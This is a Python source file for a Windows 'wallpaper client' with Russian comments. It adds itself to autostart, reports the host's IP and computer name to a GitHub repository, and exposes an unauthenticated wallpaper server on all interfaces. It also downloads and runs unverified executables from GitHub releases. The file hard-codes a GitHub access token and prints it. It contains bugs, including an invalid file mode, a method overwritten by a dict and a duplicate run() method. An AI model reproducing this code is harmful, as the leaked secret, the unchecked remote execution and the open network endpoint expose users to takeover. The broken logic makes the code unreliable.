import os
import sys
import json
import time
import winreg
import ctypes
import shutil
import logging
import requests
import threading
from flask import Flask, request, jsonify, send_file
from PIL import Image
import tempfile
import base64
from io import BytesIO
import subprocess
import socket
import base64

logging.basicConfig(
    filename=os.path.join(os.path.expanduser("~"), ".wallpaper_client.log"),
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class WallpaperClient:

    def __init__(self):
        self.app = Flask(__name__)
        self.app.logger.setLevel(logging.ERROR)  # Отключаем лишние логи Flask
        self.setup_routes()
        self.load_config_file = os.path.join(os.path.expanduser("~"), ".wallpaper_config.json")
        self.load_config()
        
    def load_config(self):

        default_config = {
            "github_repo": "adminhelpers/dimka1c",  # Замените на ваш репозиторий
            "github_token": "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",  # Добавьте ваш GitHub токен
            "current_version": "1.0.0",
            "server_port": 8888,
            "check_updates_interval": 3600
        }
        
        if os.path.exists(self.load_config_file):
            try:
                with open(self.load_config_file, 'wr') as f:
                    self.load_config = json.load(f)
            except:
                print('Ошибка обработки')
                self.load_config = default_config
        else:
            self.load_config = default_config
            self.save_config()
        ipconfig = self.get_local_ip()
        self.update_ip_in_github(ipconfig)

    def get_local_ip(self):
        print('Получение локального IP адреса')
        try:
            # Подключаемся к внешнему адресу, чтобы узнать локальный IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            print(local_ip)
            return local_ip
        except Exception:
            # Fallback метод
            return socket.gethostbyname(socket.gethostname())

    def update_ip_in_github(self, ip_address):
        print('Обновление IP адреса в GitHub репозитории')
        try:
            print(self.load_config)
            repo_path = self.load_config['github_repo']
            print(f'repo_path: {repo_path}')
            github_token = self.load_config['github_token']  # Добавим в конфиг
            print(f'github token: {github_token}')
            print('Проверка github token.... ')
            if not github_token:
                print('GitHub token не найден')
                logging.warning("GitHub token не найден, пропускаем обновление IP")
                return False
            
            
            # Данные для файла
            file_data = {
                "ip_address": ip_address,
                "port": self.load_config['server_port'],
                "last_update": time.strftime("%Y-%m-%d %H:%M:%S"),
                "computer_name": socket.gethostname()
            }
            print('file_date upload yes')
            
            # Конвертируем в JSON и кодируем в base64
            file_content = json.dumps(file_data, indent=2)
            encoded_content = base64.b64encode(file_content.encode()).decode()
            
            # GitHub API URL для создания/обновления файла
            api_url = f"https://api.github.com/repos/{repo_path}/contents/client_info.json"
            
            headers = {
                "Authorization": f"token {github_token}",
                "Accept": "application/vnd.github.v3+json"
            }
            
            # Сначала попробуем получить SHA существующего файла
            response = requests.get(api_url, headers=headers)
            sha = None
            if response.status_code == 200:
                sha = response.json()['sha']
            
            # Подготавливаем данные для создания/обновления
            data = {
                "message": f"Update client IP to {ip_address}",
                "content": encoded_content,
                "branch": "main"  # или "master" в зависимости от вашего репозитория
            }
            
            if sha:
                data["sha"] = sha  # Для обновления существующего файла
            
            # Отправляем запрос
            response = requests.put(api_url, headers=headers, json=data)
            
            print('+')
            print(response)
            if response.status_code in [200, 201]:
                print(f"IP адрес {ip_address} успешно обновлен в GitHub")
                return True
            else:
                print(f"Ошибка обновления IP в GitHub: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            print(f"Ошибка обновления IP в GitHub: {e}")
            return False

    def run(self):
        """Основной метод запуска с обновлением IP"""
        logging.info("Запуск WallpaperClient")
        
        # Добавляем в автозагрузку при первом запуске
        if not self.check_if_in_startup():
            self.add_to_startup()
        
        # Получаем и обновляем IP в GitHub
        local_ip = self.get_local_ip()
        self.update_ip_in_github(local_ip)
        
        # Запускаем поток проверки обновлений
        update_thread = threading.Thread(target=self.update_checker_thread, daemon=True)
        update_thread.start()
        
        # Проверяем обновления при запуске
        self.check_for_updates()
        
        # Запускаем веб-сервер
        try:
            self.app.run(host='0.0.0.0', port=self.load_config['server_port'], debug=False)
        except Exception as e:
            logging.error(f"Ошибка запуска сервера: {e}")

    
    def save_config(self):
        """Сохранение конфигурации"""
        with open(self.load_config_file, 'w') as f:
            json.dump(self.load_config, f)
    
    def add_to_startup(self):
        """Добавление в автозагрузку Windows"""
        try:
            exe_path = os.path.abspath(sys.argv[0])
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WallpaperClient", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            logging.info("Добавлено в автозагрузку")
            return True
        except Exception as e:
            logging.error(f"Ошибка добавления в автозагрузку: {e}")
            return False
    
    def check_if_in_startup(self):
        """Проверка, добавлен ли в автозагрузку"""
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_READ
            )
            value, _ = winreg.QueryValueEx(key, "WallpaperClient")
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    def get_current_wallpaper(self):
        """Получение текущих обоев"""
        try:
            # Получаем путь к текущим обоям
            ubuf = ctypes.create_unicode_buffer(512)
            ctypes.windll.user32.SystemParametersInfoW(73, 512, ubuf, 0)
            wallpaper_path = ubuf.value
            
            if os.path.exists(wallpaper_path):
                # Конвертируем в base64 для передачи
                with open(wallpaper_path, 'rb') as f:
                    image_data = f.read()
                
                # Создаем превью (уменьшенную версию)
                img = Image.open(BytesIO(image_data))
                img.thumbnail((300, 200))
                
                buffer = BytesIO()
                img.save(buffer, format='JPEG')
                preview_data = base64.b64encode(buffer.getvalue()).decode()
                
                return {
                    'success': True,
                    'path': wallpaper_path,
                    'preview': preview_data
                }
            else:
                return {'success': False, 'error': 'Wallpaper file not found'}
        except Exception as e:
            logging.error(f"Ошибка получения обоев: {e}")
            return {'success': False, 'error': str(e)}
    
    def set_wallpaper(self, image_path):
        """Установка обоев"""
        try:
            # Конвертируем в правильный формат если нужно
            if not image_path.lower().endswith(('.bmp', '.jpg', '.jpeg')):
                img = Image.open(image_path)
                new_path = os.path.join(tempfile.gettempdir(), "wallpaper.jpg")
                img.save(new_path, 'JPEG')
                image_path = new_path
            
            # Устанавливаем обои
            SPI_SETDESKWALLPAPER = 20
            result = ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER, 0, image_path, 3
            )
            
            if result:
                logging.info(f"Обои установлены: {image_path}")
                return True
            else:
                logging.error("Не удалось установить обои")
                return False
                
        except Exception as e:
            logging.error(f"Ошибка установки обоев: {e}")
            return False
    
    def check_for_updates(self):
        """Проверка обновлений на GitHub"""
        try:
            repo = self.load_config['github_repo']
            url = f"https://api.github.com/repos/{repo}/releases/latest"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                release_data = response.json()
                latest_version = release_data['tag_name'].lstrip('v')
                current_version = self.load_config['current_version']
                
                if latest_version != current_version:
                    logging.info(f"Найдено обновление: {latest_version}")
                    return self.download_and_update(release_data)
                else:
                    logging.info("Обновлений не найдено")
                    return False
            else:
                logging.error(f"Ошибка проверки обновлений: {response.status_code}")
                return False
                
        except Exception as e:
            logging.error(f"Ошибка проверки обновлений: {e}")
            return False
    
    def download_and_update(self, release_data):
        """Скачивание и установка обновления"""
        try:
            # Ищем exe файл в релизе
            exe_asset = None
            for asset in release_data['assets']:
                if asset['name'].endswith('.exe'):
                    exe_asset = asset
                    break
            
            if not exe_asset:
                logging.error("Exe файл не найден в релизе")
                return False
            
            # Скачиваем новую версию
            download_url = exe_asset['browser_download_url']
            response = requests.get(download_url, stream=True)
            
            if response.status_code == 200:
                current_exe = os.path.abspath(sys.argv[0])
                new_exe = current_exe + ".new"
                
                with open(new_exe, 'wb') as f:
                    for chunk in response.iter_content(chunk_size=8192):
                        f.write(chunk)
                
                # Обновляем версию в конфиге
                self.load_config['current_version'] = release_data['tag_name'].lstrip('v')
                self.save_config()
                
                # Создаем bat файл для замены exe
                bat_content = f"""
                    @echo off
                    timeout /t 2 /nobreak >nul
                    move "{new_exe}" "{current_exe}"
                    start "" "{current_exe}"
                    del "%0"
                """
                bat_path = os.path.join(tempfile.gettempdir(), "update.bat")
                with open(bat_path, 'w') as f:
                    f.write(bat_content)
                
                # Запускаем обновление
                subprocess.Popen(bat_path, shell=True)
                logging.info("Запущено обновление")
                sys.exit(0)
                
        except Exception as e:
            logging.error(f"Ошибка обновления: {e}")
            return False
    
    def setup_routes(self):
        """Настройка API маршрутов"""
        
        @self.app.route('/status', methods=['GET'])
        def status():
            return jsonify({'status': 'running', 'version': self.load_config['current_version']})
        
        @self.app.route('/wallpaper', methods=['GET'])
        def get_wallpaper():
            return jsonify(self.get_current_wallpaper())
        
        @self.app.route('/wallpaper', methods=['POST'])
        def set_wallpaper_route():
            try:
                if 'image' not in request.files:
                    return jsonify({'success': False, 'error': 'No image file'})
                
                file = request.files['image']
                if file.filename == '':
                    return jsonify({'success': False, 'error': 'No file selected'})
                
                # Сохраняем временно
                temp_path = os.path.join(tempfile.gettempdir(), f"wallpaper_{int(time.time())}.jpg")
                file.save(temp_path)
                
                # Устанавливаем обои
                success = self.set_wallpaper(temp_path)
                
                return jsonify({'success': success})
                
            except Exception as e:
                logging.error(f"Ошибка API установки обоев: {e}")
                return jsonify({'success': False, 'error': str(e)})
    
    def update_checker_thread(self):
        """Поток для периодической проверки обновлений"""
        while True:
            time.sleep(self.load_config['check_updates_interval'])
            self.check_for_updates()
    
    def run(self):
        """Основной метод запуска"""
        logging.info("Запуск WallpaperClient")
        
        # Добавляем в автозагрузку при первом запуске
        if not self.check_if_in_startup():
            self.add_to_startup()
        
        # Запускаем поток проверки обновлений
        update_thread = threading.Thread(target=self.update_checker_thread, daemon=True)
        update_thread.start()
        
        # Проверяем обновления при запуске
        self.check_for_updates()
        
        # Запускаем веб-сервер
        try:
            self.app.run(host='0.0.0.0', port=self.load_config['server_port'], debug=False)
        except Exception as e:
            logging.error(f"Ошибка запуска сервера: {e}")

if __name__ == "__main__":
    client = WallpaperClient()
    client.run()
